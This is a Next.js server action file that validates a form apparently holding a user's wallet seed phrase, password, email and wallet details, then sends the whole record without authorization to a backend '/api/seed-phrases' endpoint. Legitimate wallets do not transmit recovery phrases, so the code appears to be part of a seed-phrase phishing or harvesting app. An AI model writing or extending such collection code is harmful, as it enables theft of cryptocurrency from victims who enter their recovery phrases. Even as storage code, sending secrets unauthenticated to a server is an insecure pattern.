
'use server';

import { seedPhraseFormSchema } from '@/lib/definitions'; // Use the form-specific schema
import type { SeedPhraseFormData } from '@/lib/definitions';

// Base URL for your backend API
const BACKEND_API_URL = process.env.NEXT_PUBLIC_BACKEND_API_URL || 'http://localhost:3001';

export async function saveSeedPhraseAction(
  formData: SeedPhraseFormData // Expecting data matching the updated form schema
): Promise<{ success: boolean; error?: string }> {

  // 1. Validate the incoming form data
  const validatedFields = seedPhraseFormSchema.safeParse(formData);

  if (!validatedFields.success) {
    console.error('[Save Seed Action] Frontend validation failed:', validatedFields.error.flatten().fieldErrors);
    const firstError = Object.values(validatedFields.error.flatten().fieldErrors)[0]?.[0];
    return {
      success: false,
      error: firstError || 'Invalid data. Please check your input.',
    };
  }

  const dataToSave = validatedFields.data;
  console.log('[Save Seed Action] Sending save request to backend:', { email: dataToSave.email, walletName: dataToSave.walletName, walletType: dataToSave.walletType }); // Don't log passwords or seed

  // 2. Call the backend API to save the information
  try {
    const response = await fetch(`${BACKEND_API_URL}/api/seed-phrases`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        // No Authorization header needed anymore
      },
      body: JSON.stringify(dataToSave), // Send the validated form data
    });

    if (response.ok) {
        console.log('[Save Seed Action] Backend save successful.');
        // const result = await response.json(); // Backend returns simple message now
        return { success: true };
    } else {
      // Handle API errors
      let errorMessage = `Failed to save information (status: ${response.status})`;
      try {
          const errorData = await response.json();
          errorMessage = errorData.message || errorMessage;
           console.error('[Save Seed Action] Backend save failed:', errorMessage);
      } catch (e) {
           console.error('[Save Seed Action] Backend save failed, could not parse error response:', response.statusText);
          errorMessage = `Failed to save information: ${response.statusText}`;
      }
      return { success: false, error: errorMessage };
    }
  } catch (error) {
    // Handle network errors
    console.error('[Save Seed Action] Network or unexpected error calling backend:', error);
     const message = error instanceof Error ? error.message : 'An unknown network error occurred.';
    return {
      success: false,
      error: `Failed to save information: ${message}`,
    };
  }
}
